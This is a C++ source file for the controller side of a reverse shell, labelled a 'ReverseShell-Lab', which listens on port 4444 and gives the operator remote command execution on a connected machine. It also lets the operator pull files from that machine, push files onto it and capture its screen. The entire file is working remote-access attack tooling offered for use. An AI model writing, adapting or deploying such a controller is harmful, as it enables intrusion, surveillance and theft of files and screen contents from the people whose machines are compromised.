#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fstream>
#include <vector>
#include <sstream>
#include <sys/select.h>
#include <ctime>

using namespace std;

#define PORT 4444
#define BS 4096
#define TIMEOUT 10

bool send_all(int s, const char *b, int l)
{
    int t = 0;
    while (t < l)
    {
        int n = send(s, b + t, l - t, 0);
        if (n <= 0)
            return false;
        t += n;
    }
    return true;
}

bool recv_exact(int s, char *b, int l)
{
    int t = 0;
    while (t < l)
    {
        fd_set f;
        FD_ZERO(&f);
        FD_SET(s, &f);
        struct timeval tv = {TIMEOUT, 0};
        if (select(s + 1, &f, NULL, NULL, &tv) <= 0)
            return false;
        int n = recv(s, b + t, l - t, 0);
        if (n <= 0)
            return false;
        t += n;
    }
    return true;
}

bool send_msg(int s, const string &m)
{
    uint32_t l = m.size();
    char h[4] = {(char)(l & 0xFF), (char)((l >> 8) & 0xFF), (char)((l >> 16) & 0xFF), (char)((l >> 24) & 0xFF)};
    return send_all(s, h, 4) && send_all(s, m.c_str(), l);
}

string recv_msg(int s)
{
    char h[4];
    if (!recv_exact(s, h, 4))
        return "";
    uint32_t l = (uint8_t)h[0] | ((uint32_t)(uint8_t)h[1] << 8) | ((uint32_t)(uint8_t)h[2] << 16) | ((uint32_t)(uint8_t)h[3] << 24);
    if (l > 100000000)
        return "";
    string m(l, '\0');
    if (!recv_exact(s, &m[0], l))
        return "";
    return m;
}

vector<string> split(const string &s, char d)
{
    vector<string> r;
    string t;
    istringstream ss(s);
    while (getline(ss, t, d))
        r.push_back(t);
    return r;
}

int main()
{
    cout << "\n  zerodayiq ReverseShell-Lab\n";
    cout << "  Listening on port " << PORT << " ...\n\n";

    struct addrinfo h, *r;
    memset(&h, 0, sizeof(h));
    h.ai_family = AF_INET;
    h.ai_socktype = SOCK_STREAM;
    h.ai_protocol = IPPROTO_TCP;
    h.ai_flags = AI_PASSIVE;
    getaddrinfo(NULL, to_string(PORT).c_str(), &h, &r);

    int srv = socket(r->ai_family, r->ai_socktype, r->ai_protocol);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    bind(srv, r->ai_addr, r->ai_addrlen);
    freeaddrinfo(r);
    listen(srv, SOMAXCONN);

    struct sockaddr_in ca;
    socklen_t al = sizeof(ca);
    int cli = accept(srv, (struct sockaddr *)&ca, &al);
    cout << "[+] Connected: " << inet_ntoa(ca.sin_addr) << ":" << ntohs(ca.sin_port) << "\n\n";

    while (true)
    {
        string cmd;
        cout << "$ ";
        getline(cin, cmd);
        if (cmd.empty())
            continue;
        if (cmd == "exit")
        {
            send_msg(cli, cmd);
            break;
        }

        vector<string> p = split(cmd, ' ');

        if (p[0] == "download" && p.size() >= 3)
        {
            send_msg(cli, cmd);
            string res = recv_msg(cli);
            if (res.empty())
            {
                cout << "[-] Connection lost.\n";
                break;
            }
            if (res.find("[+]") != string::npos)
            {
                string sz = recv_msg(cli);
                if (sz.empty() || sz == "0")
                {
                    cout << "[-] Error.\n";
                    continue;
                }
                streamsize fs = stoll(sz);
                send_msg(cli, "ok");
                ofstream of(p[2], ios::binary);
                vector<char> buf(BS);
                streamsize rem = fs;
                while (rem > 0)
                {
                    int rd = min((streamsize)BS, rem);
                    if (!recv_exact(cli, buf.data(), rd))
                        break;
                    of.write(buf.data(), rd);
                    rem -= rd;
                }
                of.close();
                cout << (rem == 0 ? "[+] Saved: " + p[2] + "\n" : "[-] Incomplete.\n");
            }
            else
                cout << res << endl;
        }
        else if (p[0] == "upload" && p.size() >= 3)
        {
            ifstream in(p[1], ios::binary | ios::ate);
            if (!in)
            {
                cout << "[-] File not found: " << p[1] << endl;
                continue;
            }
            streamsize fs = in.tellg();
            in.seekg(0, ios::beg);
            send_msg(cli, "upload " + p[2] + " " + to_string(fs));
            string ack = recv_msg(cli);
            if (ack.find("READY") == string::npos)
            {
                cout << "[-] Client denied.\n";
                continue;
            }
            vector<char> buf(BS);
            while (in.read(buf.data(), buf.size()) || in.gcount() > 0)
                send_all(cli, buf.data(), in.gcount());
            in.close();
            cout << recv_msg(cli) << endl;
        }
        else if (p[0] == "screenshot")
        {
            send_msg(cli, cmd);
            string res = recv_msg(cli);
            if (res.empty())
            {
                cout << "[-] Connection lost.\n";
                break;
            }
            if (res.find("[+]") != string::npos)
            {
                string sz = recv_msg(cli);
                if (sz.empty() || sz == "0")
                {
                    cout << "[-] Error.\n";
                    continue;
                }
                streamsize fs = stoll(sz);
                send_msg(cli, "ok");
                char fn[64];
                time_t t = time(0);
                struct tm *tm = localtime(&t);
                sprintf(fn, "screen_%02d%02d_%02d%02d%02d.bmp", tm->tm_mon + 1, tm->tm_mday, tm->tm_hour, tm->tm_min, tm->tm_sec);
                ofstream of(fn, ios::binary);
                vector<char> buf(BS);
                streamsize rem = fs;
                while (rem > 0)
                {
                    int rd = min((streamsize)BS, rem);
                    if (!recv_exact(cli, buf.data(), rd))
                        break;
                    of.write(buf.data(), rd);
                    rem -= rd;
                }
                of.close();
                cout << (rem == 0 ? "[+] Screenshot: " + string(fn) + "\n" : "[-] Incomplete.\n");
            }
            else
                cout << res << endl;
        }
        else
        {
            send_msg(cli, cmd);
            string res = recv_msg(cli);
            if (res.empty())
            {
                cout << "[-] Connection lost.\n";
                break;
            }
            cout << res << endl;
        }
    }

    close(cli);
    close(srv);
    return 0;
}
